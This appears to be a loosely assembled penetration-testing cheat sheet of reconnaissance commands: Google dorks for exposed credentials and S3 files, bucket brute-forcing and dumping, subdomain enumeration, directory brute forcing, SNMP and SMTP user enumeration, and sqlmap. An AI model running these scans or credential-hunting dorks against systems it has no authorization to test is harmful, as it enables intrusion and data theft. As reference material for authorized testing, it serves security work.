xprobe2 -v -p tcp:80:open 192.168.6.66



iptraf -i "wlan0"


## Cloud Google Dorks
site:*.amazonaws.com -www "compute"
site:*.amazonaws.com -www "compute" "ap-south-1"
site:pastebin.com "rds.amazonaws.com" "u " pass OR password

# AWS Buckets Dork
site:*.s3.amazonaws.com ext:xls | ext:xlsx | ext:csv password|passwd|pass user|username|uid|email


cloud_enum.py -k companynameorkeyword

AWSBucketDump.py -l $File.txt
python AWSBucketDump.py -D -l BucketNames.txt -g s.txt

php s3-buckets-bruteforcer.php --bucket gwen001-test002

s3scanner.py --include-closed --out-file $File.txt --dump $File.txt



aws sts get-caller-identity
aws s3 ls
aws s3 ls s3://bucket.com
aws s3 ls --recursive s3://bucket.com
aws iam get-account-password-policy
aws sts get-session-token




##-============================-##
##  [+] OSINT + Recon Scans:
##-============================-##
sniper -t $Target -o -re

##-==========================================-##
##  [+] OSINT + Recon Scans [Stealth Mode]
##-==========================================-##
sniper -t $Target -m stealth -o -re

##-=====================-##
##  [+] Discover mode
##-=====================-##
sniper -t $CIDR -m discover -w $Workspace

##-========================-##
##  [+] Scan $Port only
##-========================-##
sniper -t $Target -m p -p $Port


sniper -t $Target

sniper -t $Target

sniper -t $Target




##-============================-##
##  [+]
##-============================-##
amass enum -list


##-============================-##
##  [+]
##-============================-##
amass enum -src -ip -d $URL


##-============================-##
##  [+]
##-============================-##
amass enum -src -brute -d $Domain -o $File


##-============================-##
##  [+]
##-============================-##
amass intel -whois -ip -src -d $Domain -o $File


##-========================================-##
##  [+] Passively Search For Subdomains:
##-========================================-##
amass enum -passive -d $Domain -src


##-=====================================-##
##  [+] Active Subdomain Bruteforcing:
##-=====================================-##
amass enum -active -d $Domain -brute -w $File -src -ip -dir $Dir -config $File -o $File


##-=========================-##
##  [+] DNS Enumeration:
##-=========================-##
amass enum -v -src -ip -brute -min-for-recursive 2 d $Domain


##-=====================================-##
##  [+] Visualize Enumeration Results:
##-=====================================-##


##-===================================================-##
##  [+] Visualize Enumeration Results Using Maltego:
##-===================================================-##
amass viz -maltego


##-========================================-##
##  [+] Discover Targets for Enumeration:
##-========================================-##
amass intel -d $Domain


amass intel -d $Domain -whois


amass intel -org '$OrgName'


amass intel -active -asn $ASN -ip












photon -u $Domain -l 3 -t 100


EyeWitness --web --single $Domain
EyeWitness --web -f $File -d $Dir/




## --------------------------------------------- ##
##  [?] Enumerates a domain for DNS entries
## --------------------------------------------- ##
dnsdict6 -4 -d -t 16 -e -x $Domain


sslscan $ip:443
sslscan --ipv4 --show-certificate --ssl2 --ssl3 --tlsall --no-colour $Domain



echo "Please provide the target ip address and the port."

sslscan --show-certificate --verbose --no-colour --xml=sslscan_$1_$2.xml $1:$2 2>&1 | tee "$1_$2_sslscan.txt"





sslyze $Domain --resume --certinfo=basic --compression --reneg --sslv2 --sslv3

sslyze -regular $Domain


tlssled $Domain 443

sslyze $domain --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers




httprint -h $Domain -s $File.txt -P0


## ------------------------------------------------- ##
##   [+] Harvesting subdomains with assetfinder...
## ------------------------------------------------- ##
assetfinder $URL | grep '.$URL' | sort -u | tee -a $File.txt



assetfinder -subs-only $target > $subs_dir/assetfinder.txt

findomain -u $subs_dir/findomain.txt -t $target

sublist3r -v -d $target -o $subs_dir/sublist3r.txt
sed -i 's/<BR>/\n/g' $subs_dir/sublist3r.txt
sort $subs_dir/sublist3r.txt | uniq > $subs_dir/sublist3r-fl.txt

subfinder -d $target -o $subs_dir/subfinder.txt -config $config_dir/subfinder-config.yaml

amass enum  --passive -d $target -config $config_dir/amass-config.ini -o $subs_dir/amass.txt




findomain -q -f /$Dir/$File -r -u findomain_domains.txt


amass enum -df /$Dir/$File -passive -o amass_passive_domains.txt
subfinder -dL /$Dir/$File -o subfinder_domains.txt


cat domains.txt | httprobe -c 50 -t 3000 >$File.txt

cat alive.txt | aquatone -silent --ports xlarge -out $Dir/ -scan-timeout 500 -screenshot-timeout 50000 -http-timeout 6000

dirsearch.py -E -t 50 --plain-text $Dir/$File -u $host -w /$Dir/$File.txt | grep Target


amass -active -brute -o $File.txt -d $Domain


performing reconnaissance on domain names
subdomain dictionary brute force


cat $File.txt | aquatone

cat $File.xml | aquatone -nmap

cat $File.txt | aquatone -ports large

cat $File.txt | aquatone -ports 80,443,3000,3001


 | aquatone -debug
 | aquatone -http-timeout
 | aquatone -proxy
 | aquatone -out 
 | aquatone -save-body
 | aquatone -scan-timeout
 | aquatone -threads 
 | aquatone -template-path 
 | aquatone -silent 
 | aquatone -session 
 | aquatone -screenshot-timeout 
 | aquatone -resolution 





SNMP
----
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt
Metasploit Module snmp_enum
snmpcheck -t snmpservice







## --------------------------------------------------------------------- ##
##   [+] Double checking for subdomains with amass and certspotter...
## --------------------------------------------------------------------- ##
amass enum -d $URL | tee -a $URL/recon/$File.txt
curl -s https://certspotter.com/api/v0/certs\?domain\=$URL | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u
certspotter | tee -a $URL/recon/$File.txt



[+]certspotter
		curl https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | uniq
	[+]crtsh
		curl -s https://crt.sh/?q=%.$1  | sed 's/<\/\?[^>]\+>//g' | grep $1


#!/bin/bash
echo "[+] Start gather subdomain "
for i in `cat list.txt`
do
curl -s https://crt.sh/\?q\=$i\&output\=json | jq -r '.[].name_value'|sed 's/\*\.//g'|sort -u |tee -a domains.txt
done
echo "[+] httprope "
cat domains.txt |httprobe|tee live-domain.txt
echo "[+] End "





https://whois.arin.net
http://viewdns.info/
https://hunter.io/
https://www.zoomeye.org/
https://greynoise.io/
https://shodan.io/
https://censys.io/









https://api.certspotter.com/
https://crt.sh/
https://api.sublist3r.com/
https://www.dshield.org/api/
http://apidocs.emergingthreats.net/
https://api.hackerone.com/docs/v1
https://pastebin.com/api
https://www.ssllabs.com/projects/ssllabs-apis/
https://developer.shodan.io/
https://cloud.tenable.com/api#/overview
https://urlscan.io/about-api/
https://www.virustotal.com/en/documentation/public-api/
https://www.threatminer.org/api.php

http://asnlookup.com/api


https://urlhaus-api.abuse.ch/



http://isc.sans.edu/api/ip/
https://isc.sans.edu/api/ipdetails/





getSubdomains(){
    curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$1/passive_dns" | jq -r ".passive_dns[].hostname" | sort -u > tmp.txt &
    curl -s "https://jldc.me/anubis/subdomains/$1" | jq -r '.' | cut -d '"' -f2 | cut -d '[' -f1 | cut -d ']' -f1 | grep . | sort -u >> tmp.txt &
    curl -s "http://web.archive.org/cdx/search/cdx?url=*.$1/*&output=text&fl=original&collapse=urlkey" | sort | sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | sort -u >> tmp.txt &
    curl -s "https://certspotter.com/api/v0/certs?domain=$1" | jq '.[].dns_names[]' 2> /dev/null | sed 's/\"//g' | sed 's/\*\.//g' | grep -w $1\$ | sort -u >> tmp.txt &
    curl -s "https://crt.sh/?q=%.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> tmp.txt &
    curl -s "https://dns.bufferover.run/dns?q=.$1" | jq -r .FDNS_A[] 2>/dev/null | cut -d ',' -f2 | grep -o "\w.*$1" | sort -u >> tmp.txt &
    curl -s "https://dns.bufferover.run/dns?q=.$1" | jq -r .RDNS[] 2>/dev/null | cut -d ',' -f2 | grep -o "\w.*$1" | sort -u >> tmp.txt &
    curl -s "https://tls.bufferover.run/dns?q=.$1" | jq -r .Results 2>/dev/null | cut -d ',' -f3 | grep -o "\w.*$1"| sort -u >> tmp.txt &
    curl -s "https://api.hackertarget.com/hostsearch/?q=$1" | cut -d ',' -f1 | sort -u >> tmp.txt &
    curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep -oaEi "https?://[^\"\\'> ]+" | grep $1 | sed 's/https\?:\/\///' | cut -d "/" -f3 | sort -u >> tmp.txt &
    curl -s "https://riddler.io/search/exportcsv?q=pld:$1" | grep -o "\w.*$1" | cut -d ',' -f6 | sort -u >> tmp.txt &
    curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=$1" | jq '.subdomains' | cut -d '"' -f2 | cut -d '[' -f1 | cut -d ']' -f1 | grep . | sort -u >> tmp.txt &
    curl -s "https://api.threatminer.org/v2/domain.php?q=$1&rt=5" | jq -r '.results[]' | sort -u >> tmp.txt &
    curl -s "https://urlscan.io/api/v1/search/?q=domain:$1" | jq -r '.results[].page.domain' | sort -u >> tmp.txt &
    curl -s "https://www.virustotal.com/ui/domains/$1/subdomains?limit=40" | grep '"id":' | cut -d '"' -f4 | sort -u >> tmp.txt &
    csrftoken=$(curl -ILs https://dnsdumpster.com | grep csrftoken | cut -d " " -f2 | cut -d "=" -f2 | tr -d ";")
    curl -s --header "Host:dnsdumpster.com" --referer https://dnsdumpster.com --user-agent "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --data "csrfmiddlewaretoken=$csrftoken&targetip=$1" --cookie "csrftoken=$csrftoken; _ga=GA1.2.1737013576.1458811829; _gat=1" https://dnsdumpster.com >> dnsdumpster.html
    if [[ -e $1 && -s $1 ]]; then # file exists and is not zero size
        cat dnsdumpster.html | grep "https://api.hackertarget.com/httpheaders" | grep -o "\w.*$1" | cut -d "/" -f7 | grep '.' | sort -u >> tmp.txt
    fi





curl -s "https://certspotter.com/api/v0/certs?domain=$1" | jq '.[].dns_names[]' 2> /dev/null | sed 's/\"//g' | sed 's/\*\.//g' | grep -w $1\$ | sort -u >> tmp.txt &
curl -s "https://crt.sh/?q=%.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

dnsdumpster.com

censys.io/domain?q=
censys.io/certificates?q=


curl -s "https://www.virustotal.com/ui/domains/$1/subdomains?limit=40" | grep '"id":' | cut -d '"' -f4 | sort -u

curl https://www.virustotal.com/en/domain/$target/information/ -H 'Host: www.virustotal.com' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -m 30 | grep information | grep "$target" | awk '{print $3}' | sed 's/\// /g' | awk '{print $4}' >> /tmp/onlineFoundSubdomains


https://api.hackertarget.com/pagelinks/?q=
https://api.hackertarget.com/hostsearch/?q=



curl https://api.hackertarget.com/findshareddns/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/nmap/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/geoip/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/zonetransfer/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/httpheaders/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/hostsearch/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/dnslookup/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/reversedns/?q=$ip --connect-timeout 15

curl -s "https://api.hackertarget.com/hostsearch/?q=$1" | cut -d ',' -f1 | sort -u

curl http://api.hackertarget.com/hostsearch/?q=$target -m 30 | sed 's/,/ /' | awk '{print $1}' | grep "$target" >> /tmp/onlineFoundSubdomains





openssl req -new -newkey rsa:4096 -sha256 -x509 -days 365 -nodes -out spiderfoot.crt -keyout spiderfoot.key -subj "/CN=localhost"

chmod 600 spiderfoot.crt
chmod 600 spiderfoot.key





spyse -target $Target --subdomains


Get Autonomous System details
echo "AS15169" | spysecli as

Get IPv4 host details
echo "8.8.8.8" | spysecli ip

Reverse IP lookup
echo "8.8.8.8" | spysecli reverse-ip

Reverse NS lookup
echo "ns1.google.com" | spysecli reverse-ns

Subdomains lookup
echo "tesla.com" | spysecli subdomains



curl -s https://crt.sh/?q=%25.$Target

Get historical DNS A records
echo "google.com" | spysecli history-dns-a

Get historical DNS NS records
echo "google.com" | spysecli history-dns-ns

https://censys.io/api



findomain -q -f /mainData/$File -r -u findomain_domains.txt


amass enum -df /mainData/$File -passive -o ammas_passive_domains.txt
subfinder -dL /mainData/$File -o subfinder_domains.txt


cat domains.txt | httprobe -c 50 -t 3000 >alive.txt

cat alive.txt | aquatone -silent --ports xlarge -out $Path/aquatone/ -scan-timeout 500 -screenshot-timeout 50000 -http-timeout 6000

dirsearch.py -E -t 50 --plain-text dirsearch/$dirsearch_file -u $host -w /tools/dirsearch/db/dicc.txt | grep Target


amass -active -brute -o $hosts.txt -d $Domain

cat hosts.txt | aquatone

cat scan.xml | aquatone -nmap





curl -fsSL https://api.mullvad.net/www/accounts/


Generate a new pair of keys via wg

wg genkey | tee privatekey | wg pubkey > publickey


Upload the newly generate key to Mullvad

curl https://api.mullvad.net/wg/ -d account=YOUR_ACCOUNT_NUMBER --data-urlencode pubkey=`cat publickey`




##-=====================================-##ccc
##      [+]  DShield  -  Internet Storm Center API
##-=====================================-##
https://www.dshield.org/api/



 l. ccccccccccccccccccccccccccccccccccc


## ---------------------------------------------------------- ##
##   [+] Harvesting full 3rd lvl domains with sublist3r...
## ---------------------------------------------------------- ##
for domain in $(cat $url/recon/3rd-lvl-domains.txt);do sublist3r -d $domain -o $url/recon/3rd-lvls/$domain.txt;done

## ------------------------------------- ##
##  [+] Probing for alive domains...
## ------------------------------------- ##
cat $url/recon/final.txt | sort -u | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' >> $url/recon/httprobe/alive.txt



sublist3r -d $Domain

sublist3r -d $Domain --verbose --bruteforce

sublist3r -d $Target -vvv -o $Dir/domains-sublist3r-$Target.txt



subfinder -d $Domain

subfinder -d $Domain -t 100 -v


subfinder -o $Dir/domains-subfinder-$Target.txt -b -d $Target -w $Domains DEFAULT -t 100



subfinder -d $Domain | httpx -status-code


subfinder -d $Domain | httpx -title -tech-detect -status-code -title -follow-redirects




subjack -w $url/recon/httprobe/alive.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3



dnscan.py --domain $Domain --wordlist $File


dnscan -d $Target -w $Domains QUICK -o $Dir/domains-dnscan-$Target.txt




## --------------------------------- ##
##  [+] Scraping wayback data...
## --------------------------------- ##
cat $url/recon/final.txt | waybackurls | tee -a  $url/recon/wayback/wayback_output1.txt



cat domains.txt | waybackurls > urls




inurlbr.php --dork "site:$Target" -s inurlbr-$Target




urlcrazy -k $Layout -i -o $Location $URL




EyeWitness --web -f $url/recon/httprobe/alive.txt -d $url/recon/eyewitness --resolve


## ----------------------------------- ##
###  [?] whatweb - Vulnerable Scan
## ----------------------------------- ##
whatweb $IP



##-======================================================-##
##  [+] scan a website and show the results on screen:
##-======================================================-##
golismero.py scan $Target


##-=========================================================================-##
##  [+] grab Nmap results, scan all hosts found and write an HTML report:
##-=========================================================================-##
golismero.py scan -i $File.xml -o $File.html


##-===================================================================================-##
##  [+] grab results from OpenVAS and show them on screen, but dont scan anything:
##-===================================================================================-##
golismero.py import -i $File.xml



golismero scan 10.0.0.0/24 172.16.0.0/24 $Target


##-============================================================-##
##  [+] show a list of all available configuration profiles:
##-============================================================-##
golismero.py profiles


##-=============================================-##
##  [+] show a list of all available plugins:
##-=============================================-##
golismero.py plugins


##-=============================-##
##  [+] Custom plugins setup:

golismero.py scan -e spider -e plecost -e dns* $Target


##-===========================-##
##  [+] Plugin parameters:
##-===========================-##
golismero.py scan -a openvas:port=9182 -a openvas:user=tor $Target
golismero.py scan -a openvas:profile=“My new profile” $Target


##-===============================-##
##  [+] increasing debug level:
##-===============================-##
golismero.py scan -nd -vv $Target


##-===================================================-##
##  [+] dump the database from a previous scan:
##-===================================================-##
golismero.py dump -db $File.db -o $File.sql



nikto -h $IP -p 1234 $IP
nikto -C all -h 192.168.1.1 -p 80
nikto -C all -h 192.168.1.1 -p 443


nikto -h $IP -p $PORT



## ---------------------------------------------------- ##
##   [+] Proxy Enumeration (useful for open proxies)
## ---------------------------------------------------- ##
nikto -useproxy http://$IP:3128 -h $IP



nikto -Option USERAGENT=Mozilla -url=http://10.11.1.24  -o nikto.txt

nikto -port 80,443 -host $ip -o -v nikto.txt

nikto -host $IP -C all -p 80 -output $File.txt | grep -v Cookie


nikto -h $Domain -port 443 -Format htm --output $Domain.htm




dotdotpwn.pl -m http -h $IP -M GET -o unix


## ------------------------ ##
##  [+] Url brute force
## ------------------------ ##
dirb http://$IP -r -o dirb-$IP.txt

dirb http://"$1"/ | tee /tmp/results/$1/$1-dirb-$port.txt

dirb http://10.0.0.165/ /usr/share/wordlist/dirb/big.txt

list-urls.py $Domain



## ------------------------- ##
##  [+] Directory Fuzzing
## ------------------------- ##
dirb $Domain /usr/share/wordlists/dirb/big.txt -o $File.txt
gobuster -u $Domain -w /usr/share/wordlists/dirb/big.txt -t 100


## ----------------------------------------------- ##
##  [?] A for loop so you can go do other stuff
## ----------------------------------------------- ##
for wordlist in $(ls);do gobuster -u $Domain -w $File -t 100;done


gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip
gobuster -u http://$IP/  -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
gobuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403,500' -e
gobuster dir -u https://10.11.1.35 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -k -o gobuster




    gobuster -u http://10.0.0.165/
    -w /usr/share/wordlist/dirb/big.txt
    -s '200,204,301,302,307,403,500'
    -e




dirsearch -u http://$IP/ -e .php




whatweb -v $domain > data/$File_/analysis/dynamic/domain_info.txt


## --------------------------------------- ##
##   [?] identifies all known services
## --------------------------------------- ##
whatweb $IP

whatweb $ip:80 --color=never --log-brief="whattheweb.txt"


##-======================================-##
##  [+] whatweb - Pulling plugins data
##-======================================-##
whatweb --info-plugins -t 50 -v $Domain >> $File.txt


##-=============================================-##
##  [+] whatweb - Running whatweb on $Domain
##-=============================================-##
whatweb -t 50 -v $Domain >> $File.txt



dirsearch -u $Domain -e php





 HTTP Enumeration

dirsearch big.txt -e sh,txt,htm,php,cgi,html,pl,bak,old




wfuzz -c -z $File.txt --sc 200 http://$IP




##-===========================-##
##  [+] Skipfish Scanning:
##-===========================-##
## ---------------------------------------------- ##
##  skipfish -m     time threads
##  skipfish -LVY   do not update after result
## ---------------------------------------------- ##
skipfish -m 5 -LVY -W /usr/share/skipfish/dictionaries/complete.wl -u http://$IP




## --------------------------- ##
##   [?] follow redirects
##   [?] set user-agent
##   [?] set method - GET
## --------------------------- ##
curl -Iks --location -X GET -A "x-agent" $Domain


## --------------------------------- ##
##   [?] Use Proxy for connection
## --------------------------------- ##
curl -Iks --location -X GET -A "x-agent" --proxy http://127.0.0.1:4444 $Domain
curl -Iks --location -X GET -A "x-agent" --proxy socks5://127.0.0.1:9050 $Domain
curl -Iks --location -X GET -A "x-agent" --proxy socks5://127.0.0.1:1080 $Domain









##
grep "href=" index.html


##  extract domain names from the file
grep "href=" index.html	| cut -d "/" -f 3


##
grep "href=" index.html | cut -d "/" -‐f 3 | grep "\."


##
grep "href=" index.html |cut ­‐d "/" ­‐f 3 | grep "\." | cut ­‐d '"' ‐f 1


##
grep "href=" index.html | cut ­‐d  "/" ‐f  3 | grep "\." | cut ‐d '"' ­‐f 1 | sort ‐u







##
for url in $(cat list.txt); do host $url; done


##
for url in $(cat list.txt); do host $url; done | grep "has address" | cut -d " " -f 4 | sort -u


## refine the output - sort the data by the number of times
## each IP address accessed the server.
cat access.log | cut -­‐d " " ­‐f 1 | sort | uniq -‐c | sort -­urn









##-=====================================-##
##  [+] Check for title and all links
##-=====================================-##
curl $IP -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'


##-===================================================-##
##  [+] Extract all the lines that contain a string
##-===================================================-##
grep "href=" index.html


##-==============================================================-##
##  [+] Cut a string by a delimiter, filter results then sort
##-==============================================================-##
grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u


##-====================================-##
##  [+] Grep regex output to a file
##-====================================-##
cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > $OutFile.txt








##-===============================================-##
##   [+] NFS (Network File System) Enumeration
##-===============================================-##


##-=================================-##
##  [+] Show Mountable NFS Shares
##-=================================-##
nmap -sV --script=nfs-showmount $IP


##-===============================================-##
##  [+] RPC (Remote Procedure Call) Enumeration
##-===============================================-##


##-================================-##
##  [+] Connect to an RPC share
##-================================-##

## ----------------------------------------------------------------- ##
##   [?] without a username and password and enumerate privledges
## ----------------------------------------------------------------- ##
rpcclient --user="" --command=enumprivs -N $IP


## ----------------------------------------------------------------------- ##
##  [+] Connect to an RPC share with a username and enumerate privledges
## ----------------------------------------------------------------------- ##
rpcclient --user="$User" --command=enumprivs $IP





enum4linux $IP

enum4linux $IP | grep "user:" |cut -d "[" -f2 | cut -d "]" -f1





httsquash -r $Domain

httprint -h $Domain -s signatures.txt -P0







snmpcheck -t $IP -c public

snmpenum -t $IP


##-============================-##
##  [+] SNMPv3 Enumeration
##-============================-##
nmap -sV -p 161 --script=snmp-info $IP/24


## ---------------------------------------------------------- ##
## [+]  Enumerate MIB:
## ---------------------------------------------------------- ##
## [•]  1.3.6.1.2.1.25.1.6.0		## System Processes
## [•]  1.3.6.1.2.1.25.4.2.1.2		## Running Programs
## [•]  1.3.6.1.2.1.25.4.2.1.4		## Processes Path
## [•]  1.3.6.1.2.1.25.2.3.1.4		## Storage Units
## [•]  1.3.6.1.2.1.25.6.3.1.2		## Software Name
## [•]  1.3.6.1.4.1.77.1.2.25		## User Accounts
## [•]  1.3.6.1.2.1.6.13.1.3		## TCP Local Ports



snmpwalk -c public -v1 $IP 1

Snmpwalk -c <community string> -v<version> $IP 1.3.6.1.2.1.25.4.2.1.2

onesixtyone -c names -i hosts

onesixtyone -d $IP



nmap -sU --open -p 161 $1
nmap -n -Pn -sV $IP -p $IP --script=snmp-netstat,snmp-processes -oN $OUTPUT/$IP:$PORT_snmp.nmap
onesixtyone -c public $IP | tee $OUTPUT/161_$IP-$PORT
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -dd $1 2>&1 | tee "snmp_onesixtyone_$1.txt"


snmpwalk -c public -v1 $IP | tee $OUTPUT/snmpwalk_$IP-$PORT
snmpwalk -c public -v1 $IP 1.3.6.1.4.1.77.1.2.25 | tee $OUTPUT/snmp_users_$IP-$PORT
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.6.13.1.3 | tee $OUTPUT/snmp_ports_$IP-$PORT
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.2 | tee $OUTPUT/snmp_process_$IP-$PORT
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.6.3.1.2 | tee $OUTPUT/snmp_software_$IP-$PORT


snmpwalk -c public -v 1 $1 2>&1 | tee "snmpwalk.txt"
snmpwalk -c public -v 1 $1 1.3.6.1.2.1.25.1.6.0 2>&1 | tee "snmpwalk_system_processes.txt"
snmpwalk -c public -v 1 $1 1.3.6.1.2.1.25.4.2.1.2 2>&1 | tee "snmpwalk_running_processes.txt"
snmpwalk -c public -v 1 $1 1.3.6.1.2.1.25.4.2.1.4 2>&1 | tee "snmpwalk_process_paths.txt"
snmpwalk -c public -v 1 $1 1.3.6.1.2.1.25.2.3.1.4 2>&1 | tee "snmpwalk_storage_units.txt"
snmpwalk -c public -v 1 $1 1.3.6.1.2.1.25.6.3.1.2 2>&1 | tee "snmpwalk_software_names.txt"
snmpwalk -c public -v 1 $1 1.3.6.1.4.1.77.1.2.25 2>&1 | tee "snmpwalk_user_accounts.txt"
snmpwalk -c public -v 1 $1 1.3.6.1.2.1.6.13.1.3 2>&1 | tee "snmpwalk_tcp_ports.txt"





##-===========================================================-##
##  [+] SnmpWalk - start browsing through the
##                 MIB (management information base) tree.
##-===========================================================-##
snmpwalk -c public -v1 $IP


##-======================================================================-##
##  [+] extract only system users use this value 1.3.6.1.4.1.77.1.2.25,
##-======================================================================-##
snmpwalk -c public -v1 $IP <MIB value>

snmpwalk public -v1 $IP 1 |grep 77.1.2.25 |cut -d” “ -f4


## --------------------------------- ##
##  [+] Enumerating Windows Users:
## --------------------------------- ##
snmpwalk -c public -v1 $IP 1.3 |grep 77.1.2.25 |cut -d" " -f4


## ------------------------------------- ##
##  [+] Enumerating Running Services
## ------------------------------------- ##
snmpwalk -c public -v1 $IP 1 |grep hrSWRunName|cut -d" " -f4


## -------------------------------------- ##
##  [+] Enumerating installed software
## -------------------------------------- ##
snmpwalk -c public -v1 $IP 1 |grep hrSWInstalledName


## ----------------------------------- ##
##  [+] Enumerating open TCP ports
## ----------------------------------- ##
snmpwalk -c public -v1 $IP 1 |grep tcpConnState |cut -d"." -f6 |sort -nu



snmpbulkwalk -v 2 -c public IP



snmpget -v 1 -c public IP version



/home/parrotsec-kiosk/Downloads/Xe1phix-ParrotSec-Kiosk-Project-GitLab-Production-Development-[Archiving-Workstation]/Xe1phix-[Pastebin]/OPEXXX/snmp-process-sniper.sh
/home/parrotsec-kiosk/Downloads/Xe1phix-ParrotSec-Kiosk-Project-GitLab-Production-Development-[Archiving-Workstation]/Xe1phix-[Scripts]/OSINT/Reconnoitre/Reconnoitre/lib/snmp_walk.py
/home/parrotsec-kiosk/Downloads/Xe1phix-ParrotSec-Kiosk-Project-GitLab-Production-Development-[Archiving-Workstation]/Xe1phix-[Scripts]/PenTestKit/snmp
/home/parrotsec-kiosk/Downloads/Xe1phix-ParrotSec-Kiosk-Project-GitLab-Production-Development-[Archiving-Workstation]/Xe1phix-[Scripts]/PenTestKit/snmp/community.lst
/home/parrotsec-kiosk/Downloads/Xe1phix-ParrotSec-Kiosk-Project-GitLab-Production-Development-[Archiving-Workstation]/Xe1phix-[Scripts]/PenTestKit/snmp/discover.sh
/home/parrotsec-kiosk/Downloads/Xe1phix-ParrotSec-Kiosk-Project-GitLab-Production-Development-[Archiving-Workstation]/Xe1phix-[Scripts]/PenTestKit/snmp/scan.sh
/home/parrotsec-kiosk/Downloads/Xe1phix-ParrotSec-Kiosk-Project-GitLab-Production-Development-[Archiving-Workstation]/Xe1phix-[Scripts]/PenTestKit/snmp/walk.sh
/home/parrotsec-kiosk/Downloads/Xe1phix-ParrotSec-Kiosk-Project-GitLab-Production-Development-[Archiving-Workstation]/Xe1phix-[Scripts]/STIG-4-Debian/scripts/check-snmp.sh
/home/parrotsec-kiosk/Downloads/Xe1phix-ParrotSec-Kiosk-Project-GitLab-Production-Development-[Archiving-Workstation]/Xe1phix-[Scripts]/lynis/include/tests_snmp
/home/parrotsec-kiosk/Downloads/Xe1phix-ParrotSec-Kiosk-Project-GitLab-Production-Development-[Archiving-Workstation]/Xe1phix-[Wiki]/Kali-learning-notes.wiki/snmp.md
/home/parrotsec-kiosk/Downloads/Xe1phix-ParrotSec-Kiosk-Project-GitLab-Production-Development-[Archiving-Workstation]/Xe1phix-[Wiki]/cheatsheets/snmpwalk






#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	#SSL Implementation (testssl)
	#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	echo -e "\n===================\nTestssl Log:\n===================\n" >> data/$File_/analysis/dynamic/ssl_scan/logs/testssl.log
	echo `date` >> data/$File_/analysis/dynamic/ssl_scan/logs/testssl.log
	echo -e "   ${no_color}[-] ${brown}Scanning ${blue}$domain ${brown}${no_color}" >> data/$File_/analysis/dynamic/ssl_scan/logs/testssl.log
	cd tools/testssl.sh/
testssl.sh -U -R -I -E -H -S -P -e -p -f -4  --sneaky --logfile ../../data/$File_/analysis/dynamic/ssl_scan/ssl_detailed.txt $domain | aha > ../../data/$File_/analysis/dynamic/ssl_scan/ssl_detailed.html
testssl.sh -U -R -I -E -H -S -P -e -p -f -4  --sneaky --logfile ../../data/domain_scans/$dump/ssl_detailed.txt $domain


	echo -e "   ${no_color}[-] ${brown}Domain scanning completed ${no_color}" >> ../../data/$File_/analysis/dynamic/ssl_scan/logs/testssl.log



testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $IP





##-============================================-##
##  [+] Get Options available from web server
##-============================================-##
curl -vX OPTIONS $Domain


##-=====================================-##
##  [+] Check for title and all links
##-=====================================-##
curl $domain -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'


##-=============================-##
##  [+]
##-=============================-##
fimap -u "http://INSERTIPADDRESS/example.php?test="


##-=============================-##
##  [+]
##-=============================-##
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $IP
>use auxiliary/scanner/smtp/smtp_enum

VRFY root
EXPN root

##-=============================-##
##  [+]
##-=============================-##
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $ip


##-=============================-##
##  [+]
##-=============================-##
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $IP -p $PORT




# Get a MySQL DB dump from a remote machine
ssh user@host "mysqldump -h localhost -u mysqluser -pP@$$W3rD databasename | gzip -cf" | gunzip -c > database.sql



# Export MySQL query as .csv file
echo "SELECT * FROM table; " | mysql -u root -p${MYSQLROOTPW} databasename | sed 's/\t/","/g;s/^/"/;s/$/"/;s/\n//g' > outfile.csv





##-===============-##
##   [+] Post
##-===============-##
sqlmap -r $File.txt -p tfUPass


##-===============-##
##   [+] Get
##-===============-##
sqlmap -u "http://$IP/index.php?id=1" --dbms=mysql


